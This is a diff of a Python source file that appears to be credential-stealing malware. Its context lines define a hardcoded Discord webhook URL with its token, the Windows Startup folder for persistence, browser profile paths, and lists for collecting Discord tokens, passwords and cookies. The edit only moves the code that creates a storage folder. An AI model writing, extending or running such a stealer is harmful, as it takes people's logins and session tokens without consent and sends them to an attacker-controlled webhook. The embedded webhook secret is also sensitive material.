@@ -22,6 +22,10 @@ STORAGE_PATH = os.path.join(APPDATA, "gruppe_storage")
 STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257880456037273611/x20GlSFLeGN3M3Zt5vA-tNVZD8knJYIYNVw5_fgFXv3x7b0nrYDp8qjI2USy729Updph"
 
+# Ensure the storage path exists
+if not os.path.exists(STORAGE_PATH):
+    os.makedirs(STORAGE_PATH)
+
 # Browser and extension paths
 CHROMIUM_BROWSERS = [
     {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
@@ -167,10 +171,6 @@ DISCORD_TOKENS = []
 PASSWORDS = []
 COOKIES = []
 DISCORD_IDS = []
-
-# Ensure the storage path exists
-if not os.path.exists(STORAGE_PATH):
-    os.makedirs(STORAGE_PATH)
 
 # Functions
 def decrypt_data(data, key):
